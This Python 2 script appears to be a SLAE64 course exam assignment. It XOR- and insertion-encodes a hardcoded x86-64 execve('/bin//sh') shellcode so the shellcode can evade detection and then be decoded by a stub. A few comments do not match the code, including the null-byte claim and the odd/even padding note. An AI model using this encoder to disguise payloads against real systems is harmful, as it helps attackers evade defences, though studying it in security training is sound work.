#!/usr/bin/env python


#Exam Assignment 4
#Insertion Encoder
#Encode Shellcode with a insertion , bytes swapping  , and XOR
#Christophe G SLAE64 - 1337


import sys
import random

def Print_To_Hex(data):
   encoded = ""
   print("\n\n")
   for p in bytearray(data):
      	encoded += '\\x'
        encoded += '{:02x}'.format(p)
   return encoded



#shellcode = bytearray(sys.stdin.read())

shellcode  = "\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\x50\x48\x89\xe2\x57\x48\x89\xe6\x48\x83\xc0\x3b\x0f\x05"

print(len(shellcode))


print("original shellcode:\n\"{0}\"\n".format(Print_To_Hex(shellcode)))

encoded = ""
encoded2 = r""


temp = []


for x in bytearray(shellcode) :
        a = random.randint(0, 128)
        b = a + 1
	temp.append(x)
        temp.append(b ^ random.randint(b , 254)) # random byte random XORed , separate range to avoid null



swap = 0

for i in range(0 , len(temp)/2):
   swap = temp[i]
   temp[i] = temp[len(temp)-i-1]
   temp[len(temp)-i-1] = swap
   swap = 0

if len(shellcode) % 2 is 0:
   temp.append(144) # 144 == 0x90 -> nop , more easy to configure decoder stub if len shellcode is odd

for x in temp:
        # XOR Encoding
	y = x ^0xbb

	encoded += '\\x'
        encoded += '{:02x}'.format(y)

	encoded2 += '0x'
        encoded2 += '{:02x},'.format(y)

encoded += "\\xff\\xff"

print("encoded shellcode:\n\"{0}\"\n".format(encoded))

encoded2 += "0xff,0xff"

print("encoded bytearray:\n{0}\n".format(encoded2))


print("encoded shellcode lenght = {0}".format(len(shellcode) * 2))




